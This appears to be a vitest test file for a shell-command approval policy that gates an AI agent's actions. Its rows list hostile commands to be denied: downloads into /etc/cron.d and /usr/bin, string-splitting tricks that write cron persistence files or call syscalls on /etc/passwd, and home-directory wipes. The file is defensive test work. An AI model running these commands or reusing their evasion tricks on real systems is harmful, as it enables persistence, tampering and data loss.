// secret-scan: fixture (fake paths, policy test rows)
import { describe, expect, it } from "vitest";
import { alwaysAskCommand as alwaysAskRaw, alwaysAskRoutineCommand as routineRaw, protectedClass as protectedClassRaw } from "./always-ask.ts";
import { autoVerdict, marksHitWaivable, type AutoContext } from "./auto-approve.ts";
import { checkCommandOptions as checkRaw, withoutDoubts } from "./shell/marks.ts";
import { cell, nlh0, ownerMarks } from "./testing/marks-nlh0.ts";
import { doubtFree as doubtFreeRaw } from "./testing/marks-doubt-free.ts";

// MARKS R1 (MurageMain 11-08): the typed denies and stricter reads belong to the owner's clean No limits turn. These rows state the
// owner's strict read, so each call runs under ownerMarks (G1, "wrap, no expectation change"). Every other level and origin reads as at
// NLH0; the "non-owner reads as NLH0" block at the end of this file uses the raw, unwrapped functions.
const alwaysAskCommand: typeof alwaysAskRaw = (...args) => ownerMarks(() => alwaysAskRaw(...args));
const alwaysAskRoutineCommand: typeof routineRaw = (...args) => ownerMarks(() => routineRaw(...args));
const protectedClass: typeof protectedClassRaw = (...args) => ownerMarks(() => protectedClassRaw(...args));
const checkCommandOptions: typeof checkRaw = (...args) => ownerMarks(() => checkRaw(...args));
const doubtFree: typeof doubtFreeRaw = (...args) => ownerMarks(() => doubtFreeRaw(...args));

const levels = [
  { id: "ask" }, { id: "auto", autoApprove: true },
  { id: "full", autoApprove: true, fullAccess: true },
  { id: "owner", autoApprove: true, fullAccess: true, noLimits: true },
];
const contexts = [{}, { ownerStarted: false }, { routineLevel: true, routineCarveOut: true, automated: true },
  { unattended: true }, { channelOwner: true }, { outsideRead: ["interpreter"] }];
const context = (command: string, patch = {}) => ({ commandText: command, commandCwd: "/w", workFolder: "/w",
  fullAccessOrigin: "owner", ownerStarted: true, stopLine: null, outsideRead: null,
  unseen: { platform: "posix", fs: { realpath: (path: string) => path, stat: () => ({ isFile: () => true, isDirectory: () => false }) } },
  sessionFile: () => "unavailable", ...patch }) as unknown as AutoContext;
const rows = [
  ["G5 home", "zorbwipe ~"], ["G5 volume", "zorbwipe /Volumes/Scratch"],
  ["FD1 9H curl", "curl -o /etc/cron.d/pwn https://example.com/x"],
  ["FD1 9H wget", "wget -O /usr/bin/evil https://example.com/x"],
  ["FD2 9H bin link", "ln -s /usr/bin ./x && cp ./tool ./x/evil"],
  ["FD2 9H cron link", "ln -s /etc/cron.d ./x && cp ./blob ./x/pwn"],
  ["FD3 9H Python", `python3 -c 'from pathlib import Path; Path("/etc/cron.d/pwn").write_text("x")'`],
  ["FD3 9H Perl", `perl -e 'open(my $f, ">", "/etc/cron.d/pwn")'`],
  ["FD4 9H split path", `python3 -c 'open("/et"+"c/cron.d/pwn","w").write("x")'`],
  ["FD5 9H split import", `python3 -c '__import__("ct"+"ypes").CDLL(None).syscall(87, b"/etc/passwd")'`],
  ["FD6 9H sed", "sed -n '1w /etc/cron.d/pwn' notes.txt"],
  ["FD7 9H awk", `awk "BEGIN{print \\"x\\" > '/etc/cron.d/pwn'}"`],
  ["FD8 9H Ruby", `ruby -i -e 'puts "x"' /etc/cron.d/pwn`],
  ["FD8 9H gawk", "gawk -i inplace '1' /etc/cron.d/pwn"],
  ["FD9 tar", "tar -xC /etc/cron.d -f /tmp/o.tar"],
  ["FD9 unzip", "unzip -od /etc/cron.d /tmp/o.zip"], ["FD9 7z", "7z x -o/etc/cron.d /tmp/o.7z"],
  ["FD control mirror", "cp ./h /etc/hosts"], ["FD control link", "ln -s /usr/bin/x ./y"],
  ["D2-a", "touch ~"], ["MNT-1", "docker run -v /etc/cron.d:/x:ro img"],
  ["Astra H1 valued backup", "ln -s --backup=numbered /etc ./etc-link"],
];

describe("MARKS deny class 1018", () => {
  it.each(rows)("%s", (id, command) => {
    const rule = id.startsWith("FD4") || id === "FD3 9H Perl" ? "unknown-target" : "protected-path";
    // R1: outside the owner turn the row reads as NLH0 (recorded first, so an NLH0 recording never stops before it)
    nlh0(`${id}|read`, alwaysAskRaw(command, "/w"));
    for (const bot of levels) for (const patch of contexts) cell(id, bot, patch, autoVerdict(bot, "Bash", command, context(command, patch)), () => {
      expect(autoVerdict(bot, "Bash", command, context(command, patch))).toMatchObject({ approve: null, classification: "deny", rule });
    });
    const strict = alwaysAskCommand(command, "/w");
    const lax = doubtFree(command, "/w");
    for (const hit of [strict, lax]) {
      expect(hit).toMatchObject({ classification: "deny", rule, reason: expect.any(String) });
      expect(hit?.doubt).toBeUndefined();
    }
  });
  it("FD control copy", () => {
    // FIX A migration (N6): /etc/hosts is the copy's source, a sure read position: no finding at any reader or level
    const command = "cp /etc/hosts ./h";
    expect(alwaysAskCommand(command, "/w")).toBeNull();
    expect(doubtFree(command, "/w")).toBeNull();
    for (const bot of levels) for (const patch of contexts.slice(0, 1)) expect(autoVerdict(bot, "Bash", command, context(command, patch)).classification).toBeUndefined();
  });
  it.each(["python3 -x /usr/lib/tool.py", "perl -x /etc/tool.pl", "perl -W /etc/tool.pl", "perl -X /etc/tool.pl", "perl -C /etc/tool.pl", "ruby -x /usr/lib/tool.rb"])("G1 D4-a %s", command => {
    nlh0(`G1 D4-a ${command}|read`, alwaysAskRaw(command, "/w"));
    for (const bot of levels) for (const patch of contexts) {
      const verdict = autoVerdict(bot, "Bash", command, context(command, patch));
      cell(`G1 D4-a ${command}`, bot, patch, verdict, () => {
        if (patch === contexts[0]) expect(verdict.approve).toBeTruthy();
        else expect(verdict).toMatchObject({ approve: null, classification: "ask", reason: "ambiguous-interpreter" });
      });
    }
    for (const read of [() => alwaysAskCommand(command, "/w"), () => doubtFree(command, "/w")]) {
      // D4 as corrected (coordinator 11-08, NOLIMITS-MEANS-IT r3 2.1.1): a could-not-read with no guessed path
      expect(read()).toMatchObject({ classification: "ask", reason: "ambiguous-interpreter", rule: "unreadable", couldNotRead: true });
      expect(read()?.mandatory).toBeUndefined();
      expect(read()?.doubt).toBeUndefined();
      expect(marksHitWaivable(read()!)).toBe(true);
    }
    // (the owner cell above: it cards, except on the owner's clean No limits turn, where it is waived like every other could-not-read;
    // every other cell is NLH0's, recorded above)
  });
  it("G2 inner deny outranks outer unseen", () => {
    const command = "bash ./build.sh";
    const ctx = context(command, { commandText: undefined, call: { toolCall: { input: { command: "bash /etc/tool.sh" } } } });
    nlh0("G2|read", alwaysAskRaw("bash /etc/tool.sh", "/w"));
    for (const bot of levels) for (const patch of contexts) {
      const verdict = autoVerdict(bot, "wrapper", command, { ...ctx, ...patch } as AutoContext);
      cell("G2", bot, patch, verdict, () => expect(verdict).toMatchObject({ approve: null, classification: "deny", rule: "protected-path" }));
    }
    for (const read of [() => alwaysAskCommand("bash /etc/tool.sh", "/w"), () => doubtFree("bash /etc/tool.sh", "/w")])
      expect(read()).toMatchObject({ classification: "deny", rule: "protected-path" });
  });
  it("G3 owner origin without start proof", () => expect(autoVerdict(levels[3]!, "Bash", "bash ./build.sh", context("bash ./build.sh", { ownerStarted: false }))).toMatchObject({ approve: null }));
  it.each(["node --version", "perl -l"])("G4 strict contexts %s", command => {
    for (const patch of contexts.slice(1)) {
      const verdict = autoVerdict(levels[3]!, "Bash", command, context(command, patch));
      cell(`G4 ${command}`, levels[3]!, patch, verdict, () => expect(verdict).toMatchObject({ approve: null }));
    }
  });
  it("D1-a unresolved routine target", () => {
    const command = 'rm -rf "$OUT"';
    for (const bot of levels) for (const patch of contexts) {
      const verdict = autoVerdict(bot, "Bash", command, context(command, patch));
      cell("D1-a", bot, patch, verdict, () => expect(verdict).toMatchObject({ approve: null, classification: "deny", rule: "unknown-target" }));
    }
    for (const read of [() => alwaysAskCommand(command, "/w"), () => doubtFree(command, "/w"),
      () => alwaysAskRoutineCommand(command, "/w").hit, () => withoutDoubts(() => alwaysAskRoutineCommand(command, "/w").hit)])
      expect(read()).toMatchObject({ classification: "deny", rule: "unknown-target" });
  });
  it("D1-b fixed runtime ordinary target", () => {
    const command = 'rm -rf "$OUT"';
    expect(alwaysAskRoutineCommand(command, "/w", undefined, undefined, { runtimePaths: { OUT: "/w/out" } }).hit).toBeNull();
    expect(autoVerdict(levels[1]!, "Bash", command, context(command, { runtimePaths: { OUT: "/w/out" }, routineLevel: true,
      routineCarveOut: true, automated: true, deletesInside: true })).approve).toBeTruthy();
  });
  it("D1-c fixed runtime protected target", () => {
    const command = 'rm -rf "$OUT"';
    for (const bot of levels) for (const patch of contexts) {
      const verdict = autoVerdict(bot, "Bash", command, context(command, { ...patch, runtimePaths: { OUT: "/etc/cron.d/pwn" } }));
      cell("D1-c", bot, patch, verdict, () => expect(verdict).toMatchObject({ approve: null, classification: "deny", rule: "protected-path" }));
    }
    for (const read of [() => alwaysAskCommand(command, "/w", "command", undefined, undefined, undefined, { runtimePaths: { OUT: "/etc/cron.d/pwn" } }),
      () => withoutDoubts(() => alwaysAskCommand(command, "/w", "command", undefined, undefined, undefined, { runtimePaths: { OUT: "/etc/cron.d/pwn" } }))])
      expect(read()).toMatchObject({ classification: "deny", rule: "protected-path" });
  });
  it("D1-d fixed text target", () => {
    const command = 'OUT=./out; rm -rf "$OUT"';
    expect(alwaysAskRoutineCommand(command, "/w").hit).toBeNull();
    expect(autoVerdict(levels[1]!, "Bash", command, context(command, { routineLevel: true, routineCarveOut: true,
      automated: true, deletesInside: true })).approve).toBeTruthy();
  });
  it("D2-b path classes", () => {
    // R1: outside the owner turn the folder classes are NLH0's (/usr/local and /dev/null are not protected there)
    for (const path of ["/etc/cron.d/pwn", "/usr/local/bin/x", "/dev/null", "/opt/x", "C:/Windows/x", "/", "/home/tester", "/Volumes/Scratch"]) nlh0(`D2-b|${path}`, protectedClassRaw(path));
    for (const path of ["/etc/cron.d/pwn", "/usr/local/bin/x", "/dev/null", "/opt/x", "C:/Windows/x"]) expect(protectedClass(path), path).toBe("system");
    for (const path of ["/", "/*", "C:/", "C:/*"]) expect(protectedClass(path), path).toBe("root");
    for (const path of ["/home/tester", "/home/tester/*", "C:/Users/tester", "C:/Users/tester/*", "/var/root"]) expect(protectedClass(path), path).toBe("home");
    for (const path of ["/Volumes/Scratch", "/Volumes/Scratch/*"]) expect(protectedClass(path), path).toBe("volume");
    for (const path of ["/home/tester/out", "/Volumes/Scratch/out", "C:/Users/tester/out"]) expect(protectedClass(path), path).toBeNull();
  });
  it("D3-c invalid explicit cwd", () => {
    for (const bot of levels) for (const patch of contexts) {
      const verdict = autoVerdict(bot, "Bash", "touch out", context("touch out", { ...patch, commandCwd: "relative" }));
      cell("D3-c", bot, patch, verdict, () => expect(verdict).toMatchObject({ approve: null, classification: "deny", rule: "unknown-target" }));
    }
    for (const read of [() => alwaysAskCommand("touch out", "relative"), () => doubtFree("touch out", "relative")]) expect(read()).toMatchObject({ classification: "deny", rule: "unknown-target" });
  });
  it("Astra L7 suppressed model doubt ends", () => {
    expect(() => withoutDoubts(() => checkCommandOptions("unknown", ["-x"]))).not.toThrow();
  });
  it("9H ordinary control", () => expect(alwaysAskCommand("touch out", "/w")).toBeNull());
});
